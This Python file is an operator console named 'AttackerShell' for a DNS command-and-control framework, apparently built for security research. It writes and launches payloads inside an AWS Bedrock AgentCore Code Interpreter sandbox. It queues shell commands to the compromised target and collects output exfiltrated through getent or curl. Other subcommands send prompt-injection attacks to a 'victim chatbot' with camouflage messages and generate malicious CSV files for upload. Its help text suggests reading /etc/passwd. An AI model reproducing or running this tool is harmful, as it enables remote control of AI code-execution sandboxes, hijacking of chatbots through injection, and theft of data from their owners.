#!/usr/bin/env python3
"""
AttackerShell - Unified tool for managing DNS C2 sessions.

Commands:
- generate: Generate a payload with a specific session ID
- execute: Execute payload in Code Interpreter
- send: Send command to a specific session
- receive: Get output from a specific session
- interactive: All-in-one interactive shell
"""

import argparse
import base64
import json
import os
import random
import string
import subprocess
import sys
import time
from pathlib import Path
from datetime import datetime
import requests
import boto3


# Setup logging to both console and file
class TeeOutput:
    """Write to both stdout and a log file."""
    def __init__(self, filename):
        self.terminal = sys.stdout
        self.log = open(filename, 'a', buffering=1)  # Append mode, line buffered
        # Write session start marker
        self.log.write(f"\n{'='*60}\n")
        self.log.write(f"Session started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        self.log.write(f"{'='*60}\n")
    
    def write(self, message):
        self.terminal.write(message)
        try:
            self.log.write(message)
            self.log.flush()
        except:
            pass
    
    def flush(self):
        self.terminal.flush()
        try:
            self.log.flush()
        except:
            pass

# Enable logging to file
sys.stdout = TeeOutput('attacker_shell.log')
sys.stderr = sys.stdout


class SessionManager:
    """Manages C2 sessions and payloads."""
    
    def __init__(self, c2_domain=None, c2_server=None):
        self.c2_domain = c2_domain or os.environ.get('DOMAIN', 'c2.bt-research-control.com')
        self.c2_server = c2_server or f"http://{os.environ.get('EC2_IP', 'localhost')}:8080"
        self.sessions = {}  # Track active sessions
        
    def generate_session_id(self, prefix='sess'):
        """Generate a unique session ID."""
        random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        return f"{prefix}_{random_suffix}"
    
    def create_payload(self, session_id, output_file=None, use_curl_for_exfil=False):
        """
        Create a payload with the specified session ID.
        
        Args:
            session_id: Unique session identifier
            output_file: Optional file to write payload to
            use_curl_for_exfil: If True, use curl instead of getent for exfiltration
                               (avoids caching issues with identical outputs)
        """
        # Read the template
        template_path = Path(__file__).parent / 'payload_client.py'
        with open(template_path, 'r') as f:
            payload_content = f.read()
        
        # Replace the session placeholder
        payload_content = payload_content.replace('SESSION_PLACEHOLDER', session_id)
        
        # Replace domain if needed
        payload_content = payload_content.replace(
            "os.environ.get('C2_DOMAIN', 'c2.bt-research-control.com')",
            f"'{self.c2_domain}'"
        )
        
        # Set exfiltration method if requested
        if use_curl_for_exfil:
            payload_content = payload_content.replace(
                "os.environ.get('USE_CURL_FOR_EXFIL', 'false').lower() == 'true'",
                "True  # Enabled: use curl to avoid getent caching"
            )
        
        if output_file:
            with open(output_file, 'w') as f:
                f.write(payload_content)
            return output_file
        
        return payload_content
    
    def queue_command(self, session_id, command):
        """Send a command to the C2 server for a specific session."""
        try:
            response = requests.post(
                f"{self.c2_server}/api/command",
                json={'command': command, 'session': session_id},
                timeout=5
            )
            return response.status_code == 200
        except Exception as e:
            print(f"[!] Error sending command: {e}")
            return False
    
    def get_output(self, session_id, since_id=0):
        """Retrieve output for a specific session."""
        try:
            response = requests.get(
                f"{self.c2_server}/api/output",
                params={'session': session_id, 'since': since_id},
                timeout=5
            )
            if response.status_code == 200:
                return response.json().get('outputs', [])
        except Exception as e:
            print(f"[!] Error getting output: {e}")
        return []
    
    def terminate_session(self, session_id):
        """Terminate a session on the C2 server."""
        try:
            response = requests.post(
                f"{self.c2_server}/api/terminate",
                json={'session': session_id},
                timeout=5
            )
            return response.status_code == 200
        except Exception as e:
            print(f"[!] Error terminating session: {e}")
            return False


class CodeInterpreterClient:
    """Manages Code Interpreter interactions."""
    
    def __init__(self, interpreter_name='kmcquade_exfil', region='us-east-1'):
        self.interpreter_name = interpreter_name
        self.region = region
        # Use control client for listing interpreters
        self.control_client = boto3.client(
            'bedrock-agentcore-control', 
            region_name=region,
            endpoint_url=f"https://bedrock-agentcore-control.{region}.amazonaws.com"
        )
        # Use regular client for execution
        self.client = boto3.client(
            'bedrock-agentcore',
            region_name=region,
            endpoint_url=f"https://bedrock-agentcore.{region}.amazonaws.com"
        )
        self.interpreter_id = self._lookup_interpreter_id()
        
    def _lookup_interpreter_id(self):
        """Look up Code Interpreter ID by name using bedrock-agentcore-control API."""
        try:
            # List all code interpreters and find by name
            response = self.control_client.list_code_interpreters()
            
            # Look for interpreter by name in the summaries
            for interpreter in response.get('codeInterpreterSummaries', []):
                if interpreter.get('name') == self.interpreter_name:
                    return interpreter.get('codeInterpreterId')
            
            # If not found by exact name match, check if interpreter_name is already a full ID
            # (e.g., kmcquade_exfil-P33GgpjOSA)
            if '-' in self.interpreter_name:
                # Might already be a full ID, return as-is
                return self.interpreter_name
            
            # If still not found, print helpful error
            print(f"[!] Code Interpreter '{self.interpreter_name}' not found")
            print(f"[!] Available interpreters:")
            for interpreter in response.get('codeInterpreterSummaries', []):
                print(f"    - {interpreter.get('name')} (ID: {interpreter.get('codeInterpreterId')})")
            
            raise ValueError(f"Code Interpreter '{self.interpreter_name}' not found")
            
        except Exception as e:
            # If API call fails, return the name as-is (might be a full ID)
            if 'not found' not in str(e).lower():
                print(f"[!] Warning: Could not list interpreters: {e}")
                print(f"[!] Attempting to use '{self.interpreter_name}' as-is")
            return self.interpreter_name
    
    def execute_payload(self, payload_content, session_id, verbose=False):
        """Execute payload in Code Interpreter using non-blocking approach."""
        try:
            # Start session
            session_response = self.client.start_code_interpreter_session(
                codeInterpreterIdentifier=self.interpreter_id,
                name=f"session-{session_id}",
                sessionTimeoutSeconds=900
            )
            ci_session_id = session_response['sessionId']
            
            # Save session ID for cleanup
            session_file = Path('.session_id')
            session_file.write_text(ci_session_id)
            
            print(f"[✓] Code Interpreter Session: {ci_session_id}")
            
            # Write payload to file (required for non-blocking execution)
            print(f"[*] Writing payload to Code Interpreter...")
            write_response = self.client.invoke_code_interpreter(
                codeInterpreterIdentifier=self.interpreter_id,
                sessionId=ci_session_id,
                name="writeFiles",
                arguments={
                    "content": [{"path": "c2_payload.py", "text": payload_content}]
                }
            )
            
            # Start payload using non-blocking startCommandExecution
            print(f"[*] Starting payload (non-blocking)...")
            start_response = self.client.invoke_code_interpreter(
                codeInterpreterIdentifier=self.interpreter_id,
                sessionId=ci_session_id,
                name="startCommandExecution",
                arguments={
                    "command": "python3 c2_payload.py"
                }
            )
            
            print(f"[✓] Payload started for session: {session_id}")
            
            # If verbose, stream the log file to see what's happening
            if verbose:
                print("\n--- CLIENT LOG (streaming for 5 seconds) ---")
                
                for i in range(5):
                    time.sleep(1)
                    log_text = self.read_log_file(ci_session_id)
                    if log_text:
                        # Show last 30 lines
                        lines = log_text.strip().split('\n')
                        print(f"\n[Update {i+1}/5]")
                        for line in lines[-30:]:
                            print(line)
                
                print("\n--- END CLIENT LOG ---\n")
            
            return ci_session_id
            
        except Exception as e:
            print(f"[!] Error executing payload: {e}")
            return None
    
    def read_log_file(self, ci_session_id, filepath="c2_client.log"):
        """Read a file from Code Interpreter using readFiles API."""
        try:
            response = self.client.invoke_code_interpreter(
                codeInterpreterIdentifier=self.interpreter_id,
                sessionId=ci_session_id,
                name="readFiles",
                arguments={
                    "paths": [filepath]
                }
            )
            
            # Parse the streaming response
            log_content = ""
            for event in response.get('stream', []):
                # Check for file content in result
                if 'result' in event:
                    result = event['result']
                    if 'content' in result:
                        for content_item in result['content']:
                            # readFiles returns type='resource' with the file content
                            if content_item.get('type') == 'resource':
                                resource = content_item.get('resource', {})
                                # File content is in resource['text']
                                log_content += resource.get('text', '')
                            elif content_item.get('type') == 'file':
                                # Fallback: File content might be in 'content' field
                                log_content += content_item.get('content', '')
                            elif content_item.get('type') == 'text':
                                # Fallback: Sometimes it's in text field
                                log_content += content_item.get('text', '')
                
                # Also check for errors
                if 'error' in event:
                    error_msg = event['error'].get('message', 'Unknown error')
                    print(f"[!] API Error: {error_msg}")
                    return None
            
            return log_content if log_content else None
        except Exception as e:
            print(f"[!] Error reading file: {e}")
            import traceback
            traceback.print_exc()
            return None
    
    def stop_session(self):
        """Stop the Code Interpreter session."""
        session_file = Path('.session_id')
        if session_file.exists():
            ci_session_id = session_file.read_text().strip()
            try:
                self.client.stop_code_interpreter_session(
                    codeInterpreterIdentifier=self.interpreter_id,
                    sessionId=ci_session_id
                )
                session_file.unlink()
                print(f"[✓] Stopped session: {ci_session_id}")
            except Exception as e:
                print(f"[!] Error stopping session: {e}")


class AttackerShell:
    """Main attacker shell interface."""
    
    def __init__(self, verbose=False):
        self.session_manager = SessionManager()
        self.ci_client = CodeInterpreterClient()
        self.current_session = None
        self.last_output_id = 0
        self.verbose = verbose
        
    def cmd_generate(self, args):
        """Generate a payload with a session ID."""
        session_id = args.session or self.session_manager.generate_session_id()
        output_file = args.output
        
        if output_file:
            self.session_manager.create_payload(session_id, output_file)
            print(f"[✓] Payload generated: {output_file}")
        else:
            payload = self.session_manager.create_payload(session_id)
            print(f"[✓] Payload generated for session: {session_id}")
            if args.show:
                print("\n--- PAYLOAD ---")
                print(payload)
                print("--- END PAYLOAD ---\n")
        
        print(f"[*] Session ID: {session_id}")
        return session_id
    
    def cmd_execute(self, args):
        """Execute payload in Code Interpreter."""
        session_id = args.session
        
        if args.payload:
            # Read payload from file
            with open(args.payload, 'r') as f:
                payload_content = f.read()
        else:
            # Generate payload for session
            payload_content = self.session_manager.create_payload(session_id)
        
        print(f"[*] Executing payload for session: {session_id}")
        ci_session = self.ci_client.execute_payload(payload_content, session_id, verbose=self.verbose)
        
        if ci_session:
            print(f"[✓] Payload running in Code Interpreter")
            print(f"[*] DNS C2 client will start polling...")
        
        return ci_session
    
    def cmd_send(self, args):
        """Send a command to a session."""
        session_id = args.session or self.current_session
        command = args.command
        
        if not session_id:
            print("[!] No session specified. Use --session or run 'interactive' first.")
            return
        
        if self.session_manager.queue_command(session_id, command):
            print(f"[✓] Command sent to session {session_id}: {command}")
        else:
            print(f"[!] Failed to send command")
    
    def cmd_receive(self, args):
        """Get output from a session."""
        session_id = args.session or self.current_session
        
        if not session_id:
            print("[!] No session specified. Use --session or run 'interactive' first.")
            return
        
        outputs = self.session_manager.get_output(session_id, self.last_output_id)
        
        for output in outputs:
            print(f"\n[Output {output['id']}] {output['timestamp']}")
            print(output['data'])
            self.last_output_id = output['id']
        
        if not outputs:
            print("[*] No new output")
    
    def cmd_interactive(self, args):
        """Start an interactive session."""
        # Generate session ID
        session_id = self.session_manager.generate_session_id()
        print(f"\n{'='*60}")
        print(f"🎯 DNS C2 Interactive Shell")
        print(f"{'='*60}")
        print(f"Session ID: {session_id}")
        if args.use_curl:
            print(f"Exfiltration Method: curl (no caching)")
        else:
            print(f"Exfiltration Method: getent (default)")
        self.current_session = session_id
        
        # Create and execute payload
        payload_content = self.session_manager.create_payload(session_id, use_curl_for_exfil=args.use_curl)
        print(f"\n[1/2] Injecting payload into Code Interpreter...")
        
        ci_session = self.ci_client.execute_payload(payload_content, session_id, verbose=self.verbose)
        if not ci_session:
            print("[!] Failed to start Code Interpreter session")
            return
        
        # Give payload a moment to start
        print(f"[2/2] Initializing DNS C2 channel...")
        time.sleep(3)  # Brief pause for payload to start
        
        print(f"\n{'─'*60}")
        print(f"💡 Interactive Shell Ready")
        print(f"{'─'*60}")
        print(f"   • Type commands to execute on target")
        print(f"   • Type 'logs' to view client debug log")
        print(f"   • Type 'exit' to quit and cleanup")
        print(f"   • Type 'help' for more commands")
        print(f"   • Press Ctrl+C to force quit (will cleanup session)")
        print(f"{'─'*60}\n")
        
        # Interactive command loop
        try:
            while True:
                # Check for output (non-blocking)
                outputs = self.session_manager.get_output(session_id, self.last_output_id)
                if outputs:
                    for output in outputs:
                        print(f"\n{'─'*60}")
                        print(f"📤 Output from {session_id}:")
                        print(f"{'─'*60}")
                        print(output['data'])
                        print(f"{'─'*60}\n")
                        self.last_output_id = output['id']
                
                # Get command with better prompt
                try:
                    command = input(f"c2> ").strip()
                except KeyboardInterrupt:
                    print("\n\n[!] Keyboard interrupt detected")
                    print("[*] Cleaning up session...")
                    break
                except EOFError:
                    print("\n[*] EOF detected, exiting...")
                    break
                
                if not command:
                    continue
                    
                if command.lower() == 'exit':
                    print("[*] Exiting interactive shell...")
                    break
                elif command.lower() == 'logs':
                    print("\n[*] Reading client log file...")
                    log_text = self.ci_client.read_log_file(ci_session)
                    if log_text:
                        print(f"\n{'─'*60}")
                        print(f"📋 Client Log (c2_client.log)")
                        print(f"{'─'*60}")
                        print(log_text)
                        print(f"{'─'*60}\n")
                    else:
                        print("[!] Could not read log file\n")
                    continue
                elif command.lower() == 'help':
                    print("\n📖 Available Commands:")
                    print("   exit          - Quit and cleanup session")
                    print("   logs          - View client debug log")
                    print("   help          - Show this help")
                    print("   <command>     - Execute shell command on target")
                    print("\n💡 Examples:")
                    print("   whoami")
                    print("   pwd")
                    print("   ls -la")
                    print("   cat /etc/passwd")
                    print()
                    continue
                elif command:
                    # Send command
                    print(f"[→] Sending command: {command}")
                    if self.session_manager.queue_command(session_id, command):
                        print(f"[✓] Command queued on C2 server")
                        print(f"[⏳] Waiting for output (streaming client logs)...\n")
                        
                        # Poll for output with timeout, streaming logs while waiting
                        start_time = time.time()
                        timeout = 30  # 30 seconds
                        got_output = False
                        last_log_lines = 0
                        command_start_output_id = self.last_output_id  # Track output ID at command start
                        
                        print(f"{'─'*60}")
                        print(f"📋 Client Activity (live stream):")
                        print(f"{'─'*60}")
                        
                        try:
                            while time.time() - start_time < timeout:
                                # Check for command output (only new output since this command started)
                                outputs = self.session_manager.get_output(session_id, command_start_output_id)
                                if outputs:
                                    for output in outputs:
                                        print(f"\n{'─'*60}")
                                        print(f"📤 Output:")
                                        print(f"{'─'*60}")
                                        print(output['data'])
                                    print(f"{'─'*60}\n")
                                    self.last_output_id = output['id']
                                    got_output = True
                                    break  # Exit loop once we have output
                                
                                # Stream client log while waiting
                                log_text = self.ci_client.read_log_file(ci_session)
                                if log_text:
                                    lines = log_text.strip().split('\n')
                                    # Only show new lines
                                    if len(lines) > last_log_lines:
                                        for line in lines[last_log_lines:]:
                                            if line.strip():  # Skip empty lines
                                                print(f"  {line}")
                                        last_log_lines = len(lines)
                                
                                time.sleep(1)
                        except KeyboardInterrupt:
                            print(f"\n\n[!] Interrupted while waiting for output")
                            print(f"[💡] Command may still be executing on target\n")
                            # Don't break the main loop, just stop waiting for this command
                        
                        if not got_output:
                            print(f"\n{'─'*60}")
                            print(f"[⚠️] No output received after {timeout}s")
                            print(f"[💡] Check 'logs' command for full client log")
                            print(f"{'─'*60}\n")
                    else:
                        print("[!] Failed to send command\n")
                
        except KeyboardInterrupt:
            print("\n\n[!] Keyboard interrupt detected")
            print("[*] Cleaning up session...")
        except Exception as e:
            print(f"\n[!] Error: {e}")
            print("[*] Cleaning up session...")
        finally:
            # Always cleanup on exit
            print("\n" + "="*60)
            print("🧹 Cleaning Up")
            print("="*60)
            
            # Terminate session on C2 server
            print(f"[*] Terminating C2 session: {session_id}")
            if self.session_manager.terminate_session(session_id):
                print("[✓] C2 session terminated (client will exit on next poll)")
            else:
                print("[!] Failed to terminate C2 session")
            
            # Stop Code Interpreter session
            print("[*] Stopping Code Interpreter session...")
            try:
                self.ci_client.stop_session()
                print("[✓] Code Interpreter session terminated")
            except Exception as e:
                print(f"[!] Error stopping session: {e}")
            print("="*60)
            print("👋 Goodbye!\n")

    def cmd_attack(self, args):
        """Send prompt injection attack to victim chatbot."""
        from attack_client import AttackClient

        target = args.target
        if not target:
            target = os.environ.get('VICTIM_URL')

        if not target:
            print("[!] Error: Target URL required. Use --target or set VICTIM_URL env var")
            return

        print(f"\n[*] Launching attack against: {target}")

        client = AttackClient(
            target_url=target,
            c2_domain=self.session_manager.c2_domain,
            verbose=self.verbose
        )

        session_id = client.run_full_attack(message=args.message)
        self.current_session = session_id
        print(f"\n[*] Session {session_id} is now active")
        print(f"[*] Use 'send <command>' to execute commands on the compromised target\n")

    def cmd_generate_csv(self, args):
        """Generate a malicious CSV for manual upload."""
        from csv_payload_generator import generate_malicious_csv, generate_session_id

        session_id = args.session or generate_session_id()
        output_path = args.output or f"malicious_{session_id}.csv"

        info = generate_malicious_csv(
            c2_domain=self.session_manager.c2_domain,
            session_id=session_id,
            output_path=output_path,
            injection_style=args.style or "technical"
        )

        print(f"\n{'='*60}")
        print("MALICIOUS CSV GENERATED")
        print(f"{'='*60}")
        print(f"\n  File:       {info['output_path']}")
        print(f"  Session ID: {info['session_id']}")
        print(f"  C2 Domain:  {info['c2_domain']}")
        print(f"\nTo use this CSV:")
        print(f"  1. Upload to victim's chatbot web interface")
        print(f"  2. Set session: session {info['session_id']}")
        print(f"  3. Send commands: send whoami")
        print(f"{'='*60}\n")

        self.current_session = session_id

    def run(self):
        """Main entry point."""
        parser = argparse.ArgumentParser(description='AttackerShell - DNS C2 Session Manager')
        parser.add_argument('--verbose', '-v', action='store_true', help='Show Code Interpreter output stream')
        parser.add_argument('--use-curl', action='store_true', help='Use curl for exfiltration (avoids getent caching, default: getent)')
        subparsers = parser.add_subparsers(dest='command', help='Commands')
        
        # Generate command
        gen_parser = subparsers.add_parser('generate', help='Generate payload')
        gen_parser.add_argument('--session', help='Session ID (auto-generated if not specified)')
        gen_parser.add_argument('--output', '-o', help='Output file')
        gen_parser.add_argument('--show', action='store_true', help='Show payload content')
        
        # Execute command
        exec_parser = subparsers.add_parser('execute', help='Execute payload in Code Interpreter')
        exec_parser.add_argument('--session', required=True, help='Session ID')
        exec_parser.add_argument('--payload', help='Payload file (generate if not specified)')
        
        # Send command
        send_parser = subparsers.add_parser('send', help='Send command to session')
        send_parser.add_argument('command', help='Command to execute')
        send_parser.add_argument('--session', help='Session ID')
        
        # Receive output
        recv_parser = subparsers.add_parser('receive', help='Get output from session')
        recv_parser.add_argument('--session', help='Session ID')
        
        # Interactive mode
        int_parser = subparsers.add_parser('interactive', help='Start interactive session')

        # Attack command (prompt injection via victim chatbot)
        attack_parser = subparsers.add_parser('attack', help='Send prompt injection attack to victim chatbot')
        attack_parser.add_argument('--target', '-t', help='Victim chatbot URL (or set VICTIM_URL env var)')
        attack_parser.add_argument('--message', '-m', help='Analysis request message (camouflage)')

        # Generate CSV command
        csv_parser = subparsers.add_parser('generate-csv', help='Generate malicious CSV for manual upload')
        csv_parser.add_argument('--session', help='Session ID (auto-generated if not specified)')
        csv_parser.add_argument('--output', '-o', help='Output file path')
        csv_parser.add_argument('--style', choices=['technical', 'social', 'minimal'], default='technical',
                               help='Injection style (default: technical)')

        args = parser.parse_args()
        
        if not args.command:
            parser.print_help()
            return
        
        # Set verbose mode
        self.verbose = args.verbose
        
        # Execute command
        if args.command == 'generate':
            self.cmd_generate(args)
        elif args.command == 'execute':
            self.cmd_execute(args)
        elif args.command == 'send':
            self.cmd_send(args)
        elif args.command == 'receive':
            self.cmd_receive(args)
        elif args.command == 'interactive':
            self.cmd_interactive(args)
        elif args.command == 'attack':
            self.cmd_attack(args)
        elif args.command == 'generate-csv':
            self.cmd_generate_csv(args)


if __name__ == '__main__':
    shell = AttackerShell()
    shell.run()
